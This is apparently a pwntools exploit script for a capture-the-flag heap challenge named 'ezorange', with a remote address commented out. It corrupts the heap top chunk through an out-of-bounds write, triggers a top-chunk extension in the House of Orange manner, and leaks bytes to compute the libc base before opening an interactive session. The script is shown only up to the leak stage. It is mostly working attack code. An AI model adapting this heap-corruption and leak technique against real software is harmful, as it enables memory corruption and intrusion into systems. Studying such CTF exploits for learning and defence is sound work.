from pwn import *

elf = ELF("ezorange")
libc = ELF("libc.so.6")

p = elf.process()
#p = remote("104.197.118.147", 10160)
raw_input("DEBUG")


def malloc(index, size):
	p.sendlineafter("> ",b"1")
	p.sendlineafter("Orange number: ",f"{index}")
	p.sendlineafter("Size: ", f"{size}")

def modify(index,cellindex, data):
	p.sendlineafter("> ",b"2")
	p.sendlineafter("Orange number: ", f"{index}")
	p.sendlineafter("Cell index: ", f"{cellindex}")
	p.sendlineafter("New value: ", data)

def leak_byte(orange_number,cell_index):
    p.sendlineafter("> ","2")
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Cell index: ",str(cell_index))
    p.recvuntil("Current value: ")
    leak = p.recvline()[:-1]
    p.sendlineafter("New value: ",leak)
    return leak

malloc(0,24)
#change top chunk to (pageboundary - allocated chunk)
modify(0,24,b"81")
modify(0,25,b"13")
modify(0,26,b"0")
#trigger the top chunk extension
malloc(1,0xD40)

libc_leak = b'\x00'
for i in range(33,40):
    leak = leak_byte(0,i)
    leak = int(leak)
    libc_leak += p8(leak)
leak = u64(libc_leak)
libc.address = leak-0x1C5C00
log.critical("Libc base: {}".format(hex(libc.address)))

malloc(0, 0xd28)



p.interactive()

